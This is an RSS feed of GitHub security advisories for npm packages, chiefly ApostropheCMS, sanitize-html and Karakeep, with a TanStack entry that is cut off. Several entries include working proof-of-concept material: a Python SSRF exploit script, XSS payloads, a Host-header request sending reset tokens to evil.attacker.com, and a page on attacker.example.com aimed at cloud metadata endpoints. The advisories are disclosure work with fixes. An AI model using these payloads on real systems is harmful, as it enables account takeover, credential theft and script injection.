<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-05-14T18:31:47.416Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[apostrophe] Apostrophe has stored XSS via javascript: URL in Image Widget Link]]></title>
        <id>https://github.com/advisories/GHSA-5f64-7vfc-rcx6</id>
        <link href="https://github.com/advisories/GHSA-5f64-7vfc-rcx6"/>
        <updated>2026-05-14T18:27:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A stored cross-site scripting vulnerability was identified in the image widget functionality. A user with the Editor role can configure an image widget link to use a javascript: URL payload.</p>
<p>Because editors have permission to publish pages, the malicious widget can be published to the live site. When another user, including an administrator or public visitor, clicks the affected image/link, arbitrary JavaScript executes in the victim’s browser.</p>
<h3 id="affected-version">Affected Version</h3>
<p>ApostropheCMS (tested on version: v4.29.0)</p>
<h3 id="steps-to-reproduce">Steps to Reproduce</h3>
<p><strong>Precondition</strong>
Ensure at least one image exists in the media library.</p>
<p>If the media library is empty:</p>
<ul>
<li>Log in as an Editor.</li>
<li>Open the media library.</li>
<li>Upload any JPG or PNG image.</li>
<li>Set any title, for example Probe image.</li>
<li>Publish the image and close the media manager.</li>
</ul>
<p><strong>Exploitation Steps</strong></p>
<ul>
<li><p>Log in as an Editor.</p>
</li>
<li><p>Open the home page.</p>
</li>
<li><p>Enable edit mode for the page.</p>
</li>
<li><p>In the main content area, click Add content.</p>
</li>
<li><p>Select the Image widget.</p>
</li>
<li><p>Choose any existing image from the image picker and save/select it.</p>
</li>
<li><p>Open the image widget settings.</p>
</li>
<li><p>Locate the Link to field and change it to URL.</p>
</li>
<li><p>In the URL field, enter: <code>javascript:alert(document.domain)</code></p>
<img width="1249" height="979" alt="image" src="https://github.com/user-attachments/assets/c7f77177-1711-461d-b9bd-14292a6996d5">
</li>
<li><p>Save the image and click on Update.</p>
</li>
<li><p>As another user, such as an administrator or guest, open the published page and click the linked image.</p>
</li>
<li><p>Observe that the JavaScript payload executes.</p>
<img width="1267" height="1034" alt="image" src="https://github.com/user-attachments/assets/a80484b4-873a-47c1-8682-84626523008a"></li>
</ul>
<p><strong>Note</strong>: This attack can also be performed by a Contributor. However, because contributors cannot publish content directly, the malicious image widget remains in the draft version and is only visible to users with access to review drafts, such as administrators or editors.</p>
<p>If an administrator reviews and approves/publishes the affected draft, the stored XSS becomes part of the live page and can then affect all users who interact with the malicious image link.</p>
<h3 id="impact">Impact</h3>
<p>Successful exploitation allows an Editor to store a JavaScript payload in published page content. When a victim clicks the affected image link, the payload executes in the victim’s browser.</p>
<p>This may allow an attacker to:</p>
<ul>
<li>perform actions in the context of an authenticated administrator</li>
<li>access sensitive information available in the CMS interface</li>
<li>modify page content or configuration</li>
<li>conduct phishing attacks within the trusted site</li>
<li>compromise visitors who interact with the published image link</li>
</ul>
<h3 id="recommendation">Recommendation</h3>
<p>Validate and sanitize all user-supplied URLs used in widget link fields.</p>
<p>Specifically:</p>
<ul>
<li>Reject dangerous URL schemes such as javascript:, data:, and other executable schemes.</li>
<li>Allow only safe protocols such as http:, https:, mailto:, and relative URLs where appropriate.</li>
<li>Normalize and validate URLs server-side before storage.</li>
<li>Encode rendered URLs safely in templates.</li>
<li>Consider applying a strict Content Security Policy to reduce the impact of XSS.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-5f64-7vfc-rcx6">https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-5f64-7vfc-rcx6</a></li>
<li><a href="https://github.com/apostrophecms/apostrophe/releases/tag/apostrophe%404.29.0">https://github.com/apostrophecms/apostrophe/releases/tag/apostrophe%404.29.0</a></li>
<li><a href="https://github.com/advisories/GHSA-5f64-7vfc-rcx6">https://github.com/advisories/GHSA-5f64-7vfc-rcx6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5f64-7vfc-rcx6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T18:27:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apostrophe] Apostrophe has a Weak Password Recovery Mechanism for Forgotten Password and Improper Input Validation]]></title>
        <id>https://github.com/advisories/GHSA-gf43-24g3-5hw2</id>
        <link href="https://github.com/advisories/GHSA-gf43-24g3-5hw2"/>
        <updated>2026-05-14T18:27:14.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>ApostropheCMS's password reset flow constructs the reset URL using <code>req.hostname</code>, 
which is derived directly from the attacker-controlled HTTP <code>Host</code> header when 
<code>apos.baseUrl</code> is not explicitly configured. An unauthenticated attacker who knows 
a victim's email address can send a crafted reset request that causes the application 
to email the victim a reset link pointing to the attacker's domain. When the victim 
clicks the link, the valid reset token is delivered to the attacker, enabling full 
account takeover.</p>
<h2 id="affected-component">Affected Component</h2>
<p><code>modules/@apostrophecms/login/index.js</code> — <code>resetRequest</code> route<br>Precondition: <code>passwordReset: true</code> is set <strong>and</strong> <code>apos.baseUrl</code> is not configured.</p>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<p>The <code>setPrefixUrls</code> middleware (i18n layer) builds <code>req.baseUrl</code> using <code>req.hostname</code>:</p>
<pre><code class="language-js">// Simplified from i18n middleware
req.baseUrl = `${req.protocol}://${req.hostname}`;
req.absoluteUrl = req.baseUrl + req.url;
</code></pre>
<p>The <code>resetRequest</code> handler then passes this tainted value directly into URL construction:</p>
<pre><code class="language-js">const parsed = new URL(
  req.absoluteUrl,           // ← tainted by attacker's Host header
  self.apos.baseUrl
    ? undefined
    : `${req.protocol}://${req.hostname}${port}`  // ← also tainted
);
parsed.pathname = '/login';
parsed.searchParams.append('reset', reset);   // real, valid token
parsed.searchParams.append('email', user.email);
await self.email(..., { url: parsed.toString() }, ...);
// Email sent to victim with URL pointing to attacker-controlled domain
</code></pre>
<p>When <code>apos.baseUrl</code> is configured, it is used unconditionally and the attacker's 
<code>Host</code> header is ignored — that path is <strong>not</strong> vulnerable.</p>
<h2 id="attack-scenario">Attack Scenario</h2>
<ol>
<li>Attacker identifies a valid user email (e.g. from the site's public interface).</li>
<li>Attacker sends:</li>
</ol>
<pre><code>   POST /api/v1/login/reset-request
   Host: evil.attacker.com
   Content-Type: application/json

   {"email": "victim@example.com"}
</code></pre>
<ol start="3">
<li>The application emails the victim:</li>
</ol>
<pre><code>   Click here to reset your password:
   http://evil.attacker.com/login?reset=TOKEN&amp;email=victim@example.com
</code></pre>
<ol start="4">
<li>Victim clicks the link; attacker's server captures <code>TOKEN</code>.</li>
<li>Attacker calls the real target's reset endpoint with the captured token and 
sets a new password — full account takeover.</li>
</ol>
<h2 id="preconditions">Preconditions</h2>
<ul>
<li><code>passwordReset: true</code> configured in login module options (opt-in)</li>
<li><code>apos.baseUrl</code> is <strong>not</strong> set (common in development and some production deployments)</li>
<li>Attacker knows or can enumerate a valid account email</li>
</ul>
<h2 id="impact">Impact</h2>
<p>Full account takeover of any account whose email address is known to the attacker. 
No authentication or interaction beyond sending a single HTTP request is required 
from the attacker. The victim need only click a link in a legitimate-looking 
password reset email from their own site.</p>
<h2 id="remediation">Remediation</h2>
<p><strong>Operators (immediate):</strong> Always set <code>apos.baseUrl</code> in your configuration:</p>
<pre><code class="language-js">// app.js or module configuration
modules: {
  '@apostrophecms/express': {
    options: {
      baseUrl: 'https://yourdomain.com'
    }
  }
}
</code></pre>
<p><strong>Framework fix (recommended):</strong> The <code>resetRequest</code> route should refuse to proceed 
if <code>apos.baseUrl</code> is not configured, rather than falling back to the tainted 
<code>req.hostname</code>. Example:</p>
<pre><code class="language-js">// In resetRequest handler
if (!self.apos.baseUrl) {
  throw self.apos.error(
    'invalid',
    'apos.baseUrl must be configured to enable password reset'
  );
}
const parsed = new URL(self.loginUrl(), self.apos.baseUrl);
</code></pre>
<p>This eliminates the attacker-controlled input entirely from the URL construction path.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection">OWASP: Host Header Injection</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/640.html">CWE-640: Weak Password Recovery Mechanism for Forgotten Password</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-gf43-24g3-5hw2">https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-gf43-24g3-5hw2</a></li>
<li><a href="https://github.com/advisories/GHSA-gf43-24g3-5hw2">https://github.com/advisories/GHSA-gf43-24g3-5hw2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gf43-24g3-5hw2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T18:27:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apostrophe] Apostrophe has authenticated SSRF in rich-text widget import via @apostrophecms/area/validate-widget]]></title>
        <id>https://github.com/advisories/GHSA-pr28-mf3q-qpg6</id>
        <link href="https://github.com/advisories/GHSA-pr28-mf3q-qpg6"/>
        <updated>2026-05-14T18:26:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>ApostropheCMS contains an authenticated server-side request forgery (SSRF) in the rich-text widget import flow. An authenticated user who can submit/edit rich-text widget content can cause the server to fetch attacker-controlled URLs during widget validation. For image-compatible responses, the fetched content can be persisted and re-hosted by Apostrophe, allowing response exfiltration.</p>
<h3 id="details">Details</h3>
<p>  The vulnerable flow is in the rich-text widget sanitizer:</p>
<ul>
<li><code>packages/apostrophe/modules/@apostrophecms/rich-text-widget/index.js</code></li>
<li><code>packages/apostrophe/modules/@apostrophecms/area/index.js</code></li>
<li><code>packages/apostrophe/modules/@apostrophecms/widget-type/index.js</code></li>
</ul>
<p>Relevant behavior:</p>
<ol>
<li>The backend accepts a widget payload containing <code>import.html</code>.</li>
<li>It parses <code>&lt;img src=...&gt;</code> values from that HTML.</li>
<li>For each image, it resolves the URL with:<ul>
<li><code>new URL(src, input.import.baseUrl || self.apos.baseUrl)</code></li>
</ul>
</li>
<li>It then performs a server-side <code>fetch(url)</code>.</li>
<li>The fetched body is written to a temp file and imported through Apostrophe image/attachment logic.</li>
</ol>
<p>  This is reachable during widget validation through:</p>
<ul>
<li><code>POST /api/v1/@apostrophecms/area/validate-widget?aposMode=draft</code></li>
</ul>
<h3 id="poc">PoC</h3>
<ol>
<li>Start a local HTTP server with a valid PNG:</li>
</ol>
<pre><code class="language-bash">     mkdir -p /tmp/apos-poc
     base64 -d &gt; /tmp/apos-poc/secret.png &lt;&lt;'EOF'
     iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+y1n0AAAAASUVORK5CYII=
     EOF
     cd /tmp/apos-poc &amp;&amp; python3 -m http.server 7777 --bind 127.0.0.1
</code></pre>
<ol start="2">
<li>Run the following Python PoC:</li>
</ol>
<pre><code class="language-python">#!/usr/bin/env python3
import argparse
import json
import sys
from urllib.parse import urljoin

import requests


def login(base_url: str, username: str, password: str) -&gt; str:
    url = urljoin(base_url, "/api/v1/@apostrophecms/login/login")
    r = requests.post(
        url,
        json={
            "username": username,
            "password": password
        },
        timeout=20
    )
    r.raise_for_status()
    data = r.json()
    token = data.get("token")
    if not token:
      raise RuntimeError(f"Login succeeded but no token was returned: {data}")
    return token


def trigger(base_url: str, token: str, area_field_id: str, target_url: str) -&gt; dict:
    url = urljoin(
        base_url,
        "/api/v1/@apostrophecms/area/validate-widget?aposMode=draft"
    )
    payload = {
        "areaFieldId": area_field_id,
        "type": "@apostrophecms/rich-text",
        "widget": {
            "type": "@apostrophecms/rich-text",
            "content": "&lt;p&gt;seed&lt;/p&gt;",
            "import": {
                "html": f'&lt;img src="{target_url}"&gt;',
                "baseUrl": target_url.rsplit("/", 1)[0] if "/" in target_url else target_url
            }
        }
    }
    r = requests.post(
        url,
        headers={
            "Authorization": f"Bearer {token}",
            "Accept": "application/json"
        },
        json=payload,
        timeout=30
    )
    r.raise_for_status()
    return r.json()


def main() -&gt; int:
    parser = argparse.ArgumentParser(
        description="Authenticated ApostropheCMS SSRF PoC via rich-text widget import."
    )
    parser.add_argument("--base-url", default="http://127.0.0.1:3000")
    parser.add_argument("--username", default="admin")
    parser.add_argument("--password", default="admin123")
    parser.add_argument("--area-field-id", default="cd4f89f5b834d0036f3867f1507a8add")
    parser.add_argument("--target-url", default="http://127.0.0.1:7777/secret.png")
    parser.add_argument(
        "--fetch-image",
        action="store_true",
        help="Fetch the generated Apostrophe image URL after exploitation."
    )
    args = parser.parse_args()

    try:
        token = login(args.base_url, args.username, args.password)
        result = trigger(args.base_url, token, args.area_field_id, args.target_url)
    except Exception as exc:
        print(f"[!] Exploit failed: {exc}", file=sys.stderr)
        return 1

    print("[+] Login OK")
    print(f"[+] Bearer token: {token}")
    print("[+] Exploit response:")
    print(json.dumps(result, indent=2))

    widget = result.get("widget") or {}
    image_ids = widget.get("imageIds") or []
    if not image_ids:
        print("[-] No imageIds returned. Target may have been fetched but not persisted as an image.")
        return 0

    image_id = image_ids[0]
    image_path = f"/api/v1/@apostrophecms/image/{image_id}/src"
    image_url = urljoin(args.base_url, image_path)
    print(f"[+] Generated image id: {image_id}")
    print(f"[+] Generated image URL: {image_url}")

    if args.fetch_image:
        r = requests.get(image_url, allow_redirects=True, timeout=30)
        print(f"[+] Final fetch status: {r.status_code}")
        print(f"[+] Final URL: {r.url}")
        print(f"[+] Retrieved bytes: {len(r.content)}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
</code></pre>
<ol start="3">
<li>Example usage:</li>
</ol>
<pre><code class="language-bash">     python3 poc.py \
       --base-url http://127.0.0.1:3000 \
       --username admin \
       --password admin123 \
       --area-field-id cd4f89f5b834d0036f3867f1507a8add \
       --target-url http://127.0.0.1:7777/secret.png \
       --fetch-image
</code></pre>
<ol start="4">
<li>Expected result:<ul>
<li>The local listener receives:
GET /secret.png HTTP/1.1</li>
<li>The API response includes a rewritten Apostrophe image URL and imageIds.</li>
<li>The generated image URL can then be fetched through the application.</li>
</ul>
</li>
</ol>
<p>Additional note:</p>
<ul>
<li>If the target returns non-image content such as secret.txt, the SSRF still occurs, but later image processing can fail. This still allows blind or semi-blind SSRF behavior useful for internal reachability checks and rough port enumeration.</li>
</ul>
<h3 id="impact">Impact</h3>
<p>An authenticated user with permission to submit or edit rich-text widget content can:</p>
<ul>
<li>trigger server-side requests to internal services (127.0.0.1, private subnets, etc.)</li>
<li>perform blind or semi-blind internal port and service discovery</li>
<li>exfiltrate image-compatible responses because Apostrophe stores and re-hosts the fetched content</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-pr28-mf3q-qpg6">https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-pr28-mf3q-qpg6</a></li>
<li><a href="https://github.com/advisories/GHSA-pr28-mf3q-qpg6">https://github.com/advisories/GHSA-pr28-mf3q-qpg6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pr28-mf3q-qpg6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T18:26:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sanitize-html] Apostrophe has default XSS via `xmp` raw-text passthrough in `sanitize-html`]]></title>
        <id>https://github.com/advisories/GHSA-rpr9-rxv7-x643</id>
        <link href="https://github.com/advisories/GHSA-rpr9-rxv7-x643"/>
        <updated>2026-05-14T18:26:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Under the default configuration, <code>sanitize-html</code> can turn attacker-controlled content inside a disallowed <code>xmp</code> element into live HTML or JavaScript. This is a sanitizer bypass in the default <code>disallowedTagsMode: 'discard'</code> path and can lead to stored XSS in applications that render sanitized output back to users.</p>
<h3 id="details">Details</h3>
<p>In <code>sanitize-html@2.17.3</code>, the default <code>nonTextTags</code> list includes only <code>script</code>, <code>style</code>, <code>textarea</code>, and <code>option</code> in <code>index.js</code> lines 138-142. That means disallowed <code>xmp</code> tags are not treated as "drop the entire contents" tags.</p>
<p>Later, in the <code>ontext</code> handler at <code>index.js</code> lines 569-577, the code special-cases <code>textarea</code> and <code>xmp</code> and appends their text content directly to the output without escaping:</p>
<pre><code class="language-js">} else if ((options.disallowedTagsMode === 'discard' || options.disallowedTagsMode === 'completelyDiscard') &amp;&amp; (tag === 'textarea' || tag === 'xmp')) {
  result += text;
}
</code></pre>
<p>Because <code>htmlparser2</code> treats <code>xmp</code> as a raw-text element, markup inside <code>xmp</code> is parsed as text on input but becomes live markup again once it is appended unescaped to the sanitized output.</p>
<p>This creates a default sanitizer bypass. For example, a disallowed <code>&lt;xmp&gt;</code> wrapper can be used to smuggle <code>&lt;script&gt;</code> or event-handler payloads through sanitization.</p>
<p>The README also appears to contradict the implementation. In the "Discarding the entire contents of a disallowed tag" section, the documented exception list names only <code>style</code>, <code>script</code>, <code>textarea</code>, and <code>option</code>, and does not mention <code>xmp</code>.</p>
<h3 id="poc">PoC</h3>
<p>Tested locally against <code>sanitize-html@2.17.3</code> on Node.js <code>v25.2.1</code>.</p>
<ol>
<li>Install the package:</li>
</ol>
<pre><code class="language-bash">npm install sanitize-html
</code></pre>
<ol start="2">
<li>Run the following script:</li>
</ol>
<pre><code class="language-js">const sanitizeHtml = require('sanitize-html');

console.log(sanitizeHtml('&lt;xmp&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/xmp&gt;'));
console.log(sanitizeHtml('&lt;xmp&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/xmp&gt;'));
console.log(sanitizeHtml('&lt;xmp&gt;&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;&lt;/xmp&gt;'));
</code></pre>
<ol start="3">
<li>Observed output:</li>
</ol>
<pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;
&lt;img src=x onerror=alert(1)&gt;
&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;
</code></pre>
<ol start="4">
<li>Render any of the returned strings in a browser context that trusts <code>sanitize-html</code> output, for example:</li>
</ol>
<pre><code class="language-js">const dirty = '&lt;xmp&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/xmp&gt;';
const clean = sanitizeHtml(dirty);
</code></pre>
<p>If <code>clean</code> is inserted into the DOM or stored and later rendered as trusted HTML, the attacker-controlled script executes.</p>
<h3 id="impact">Impact</h3>
<p>This is a cross-site scripting vulnerability in the default sanitizer behavior. Any application that uses <code>sanitize-html</code> defaults and then renders the returned HTML as trusted output is impacted. A remote attacker who can submit HTML content can trigger execution of arbitrary JavaScript in another user's browser when that content is viewed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-rpr9-rxv7-x643">https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-rpr9-rxv7-x643</a></li>
<li><a href="https://github.com/advisories/GHSA-rpr9-rxv7-x643">https://github.com/advisories/GHSA-rpr9-rxv7-x643</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rpr9-rxv7-x643</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-14T18:26:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@karakeep/sdk] Karakeep SDK has SSRF via metascraper-logo-favicon that bypasses validateUrl protections]]></title>
        <id>https://github.com/advisories/GHSA-7rx4-c5vx-g8w3</id>
        <link href="https://github.com/advisories/GHSA-7rx4-c5vx-g8w3"/>
        <updated>2026-05-14T18:26:04.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>metascraper-logo-favicon</code> plugin makes HTTP requests to URLs extracted from attacker-controlled HTML without going through the application's <code>validateUrl()</code> SSRF protections. This allows any authenticated user to make the server fetch arbitrary internal URLs by bookmarking a page containing a crafted <code>&lt;link rel="icon"&gt;</code> tag.</p>
<h2 id="details">Details</h2>
<h3 id="protected-path-correct">Protected path (correct)</h3>
<p>Karakeep implements comprehensive SSRF protections in <code>apps/workers/network.ts</code> (lines 12-222). The <code>validateUrl()</code> function blocks loopback, private, link-local, carrier-grade NAT, and reserved IP ranges. It resolves DNS before the fetch and checks all resolved IPs against the blacklist. This function is correctly used by <code>fetchWithProxy()</code> for the main bookmark URL fetch, image downloads, RSS feeds, and webhooks.</p>
<h3 id="unprotected-path-vulnerability">Unprotected path (vulnerability)</h3>
<p>After fetching the page HTML (with SSRF protection), the content is passed to a parse subprocess (<code>apps/workers/scripts/parseHtmlSubprocess.ts</code>). Inside this subprocess, <code>metascraper-logo-favicon</code> (v5.49.5) extracts favicon URLs from the HTML DOM by matching <code>&lt;link rel="icon"&gt;</code> elements and reading their <code>href</code> attribute.</p>
<p>The plugin then calls <code>reachable-url</code> (which wraps <code>got</code>) to verify each extracted URL. These HTTP requests bypass <code>validateUrl()</code> entirely:</p>
<pre><code class="language-typescript">// apps/workers/scripts/parseHtmlSubprocess.ts, lines 62-73
metascraperLogo({
    gotOpts: {
      agent: {
        http: serverConfig.proxy.httpProxy
          ? new HttpProxyAgent(getRandomProxy(serverConfig.proxy.httpProxy))
          : undefined,
        https: serverConfig.proxy.httpsProxy
          ? new HttpsProxyAgent(getRandomProxy(serverConfig.proxy.httpsProxy))
          : undefined,
      },
    },
  }),
</code></pre>
<p>Only proxy agent configuration is provided. No URL validation hooks, no IP blacklist, no DNS resolution checks. The <code>got</code> HTTP client makes direct requests to whatever URLs are extracted from the HTML.</p>
<h3 id="data-flow">Data flow</h3>
<pre><code>1. User creates bookmark → URL validated by validateUrl() ✓
2. Page HTML fetched → via fetchWithProxy() with SSRF protection ✓
3. HTML passed to parseHtmlSubprocess via stdin
4. metascraper-logo-favicon parses &lt;link rel="icon"&gt; tags from HTML
5. Plugin calls reachable-url → got.get(faviconUrl) → NO validateUrl() ✗
6. Server makes HTTP GET to attacker-controlled internal URL
</code></pre>
<h3 id="comparison">Comparison</h3>
<p>The application explicitly protects the main URL fetch with <code>validateUrl()</code> (network.ts:136-222), which blocks all private/loopback IPs and resolves DNS before connecting. The recent commit history shows deliberate SSRF hardening ("Stricter SSRF validation" on 2025-11-02, allowlist feature on 2025-11-22). However, the metascraper plugins' internal HTTP requests are not routed through this validation.</p>
<h2 id="poc">PoC</h2>
<h3 id="1-set-up-a-malicious-page-on-a-public-url">1. Set up a malicious page on a public URL</h3>
<pre><code class="language-html">&lt;!-- Hosted at https://attacker.example.com/ssrf.html --&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Innocent Page&lt;/title&gt;
  &lt;link rel="icon" href="http://169.254.169.254/latest/meta-data/" sizes="256x256"&gt;
  &lt;link rel="icon" href="http://127.0.0.1:3000/api/v1/users/whoami" sizes="128x128"&gt;
  &lt;link rel="icon" href="http://192.168.1.1/admin" sizes="64x64"&gt;
&lt;/head&gt;
&lt;body&gt;&lt;p&gt;Normal content&lt;/p&gt;&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="2-create-a-bookmark-via-the-api">2. Create a bookmark via the API</h3>
<pre><code class="language-bash">curl -X POST http://localhost:3000/api/v1/bookmarks \
  -H "Authorization: Bearer YOUR_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"type": "link", "url": "https://attacker.example.com/ssrf.html"}'
</code></pre>
<h3 id="3-result">3. Result</h3>
<p>The main URL (<code>https://attacker.example.com/ssrf.html</code>) passes <code>validateUrl()</code> since it resolves to a public IP. After the HTML is fetched, <code>metascraper-logo-favicon</code> extracts the favicon URLs and calls <code>reachable-url</code>/<code>got</code> to verify them. The server makes HTTP GET requests to:</p>
<ul>
<li><code>http://169.254.169.254/latest/meta-data/</code> (AWS IMDS)</li>
<li><code>http://127.0.0.1:3000/api/v1/users/whoami</code> (localhost)</li>
<li><code>http://192.168.1.1/admin</code> (internal network)</li>
</ul>
<p>These requests bypass all SSRF protections.</p>
<p>Verification: Monitor outbound network traffic from the karakeep container or check the logo field in the bookmark response.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Cloud metadata access</strong>: On AWS/GCP/Azure deployments, the server can be forced to fetch instance metadata (e.g., <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>) which may expose IAM credentials.</li>
<li><strong>Internal service discovery</strong>: Attacker can probe internal network services and ports by checking whether the favicon URL was reachable.</li>
<li><strong>Redirect-based data leak</strong>: If an internal service responds with a redirect, the final URL (potentially containing tokens or session data) is stored as the bookmark's logo field and visible to the attacker.</li>
<li><strong>Bypass of explicit security controls</strong>: The application's SSRF protections (IP blacklist, DNS resolution, redirect validation) are rendered ineffective for this code path.</li>
</ul>
<h2 id="suggested-fix">Suggested Fix</h2>
<pre><code class="language-diff">// apps/workers/scripts/parseHtmlSubprocess.ts
+ import { validateUrl } from "network";
+
+ // Create a got hook that validates URLs before requests
+ const ssrfHook = {
+   beforeRequest: [
+     async (options) =&gt; {
+       const result = await validateUrl(options.url.toString(), false);
+       if (!result.ok) {
+         throw new Error(`SSRF blocked: ${result.reason}`);
+       }
+     }
+   ]
+ };
+
  metascraperLogo({
      gotOpts: {
+       hooks: ssrfHook,
        agent: { ... },
      },
  }),
</code></pre>
<p>Alternatively, run the parse subprocess in a network-restricted sandbox (network namespace, nsjail, or a Docker container with restricted networking).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/karakeep-app/karakeep/security/advisories/GHSA-7rx4-c5vx-g8w3">https://github.com/karakeep-app/karakeep/security/advisories/GHSA-7rx4-c5vx-g8w3</a></li>
<li><a href="https://github.com/karakeep-app/karakeep/pull/2763">https://github.com/karakeep-app/karakeep/pull/2763</a></li>
<li><a href="https://github.com/karakeep-app/karakeep/commit/3dc321e7d49aa3a1a2493637fb2ee21616fe5fd9">https://github.com/karakeep-app/karakeep/commit/3dc321e7d49aa3a1a2493637fb2ee21616fe5fd9</a></li>
<li><a href="https://github.com/karakeep-app/karakeep/releases/tag/v0.32.0">https://github.com/karakeep-app/karakeep/releases/tag/v0.32.0</a></li>
<li><a href="https://github.com/advisories/GHSA-7rx4-c5vx-g8w3">https://github.com/advisories/GHSA-7rx4-c5vx-g8w3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7rx4-c5vx-g8w3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T18:26:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@tanstack/start-server-core] TanStack Start - Server Core: Inbound server-function request deserialization could invoke a sibling client-referenced server function]]></title>
        <id>https://github.com/advisories/GHSA-9m65-766c-r333</id>
        <link href="https://github.com/advisories/GHSA-9m65-766c-r333"/>
        <updated>2026-05-14T16:37:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A type-confusion bug in seroval ≤ 1.5.2 (<a href="https://github.com/lxsmnsyc/seroval/security/advisories">upstream advisory</a>) allowed a crafted JSON body sent to one TanStack Start server function to trigger invocation of a different client-referenced server function as a side effect of deserializing the request payload.</p>
<p>This is not an authentication bypass and not remote code execution. The mechanism only invokes server functions that the same client could already reach directly via /_serverFn/, and the target function's full middleware chain — including any user-supplied authentication, authorization, and inputValidator — runs as it would on a direct call.</p>
<h3 id="impact">Impact</h3>
<p>To be exploitable in any meaningful sense, an application would need to expose a client-referenced server function that:</p>
<ul>
<li><input disabled="" type="checkbox"> Performs a privileged side effect, and</li>
<li><input disabled="" type="checkbox"> Has no authentication/authorization middleware, and</li>
<li><input disabled="" type="checkbox"> Has no input validation</li>
</ul>
<p>A function meeting all three is already directly callable by any unauthenticated client at its own endpoint, so the practical impact on correctly-written applications is nil. The residual concerns are:</p>
<p>A request to function A could cause function B to also execute, which may surprise observability/audit logging that keys off the request URL.</p>
<p>Request-level middleware (as opposed to per-function middleware) does not re-run for the inner invocation.
Server-only functions (isClientReferenced: false) cannot be reached through this mechanism.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to @tanstack/start-server-core ≥ 1.167.30 (or the equivalent dated release of @tanstack/react-start / @tanstack/solid-start). The fix bumps seroval to ≥ 1.5.3 and adds defense-in-depth to the serialization adapter plugin shape so adapter payloads cannot be confused with internal seroval node types.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade immediately, ensure every createServerFn(...) exposed to the client has both an .inputValidator(...) and authentication/authorization middleware via .middleware([...]). This is recommended regardless of this advisory.</p>
<h3 id="credits">Credits</h3>
<ul>
<li><a href="https://x.com/mufeedvh">Mufeed VH</a> of <a href="https://winfunc.com/">Winfunc Research</a></li>
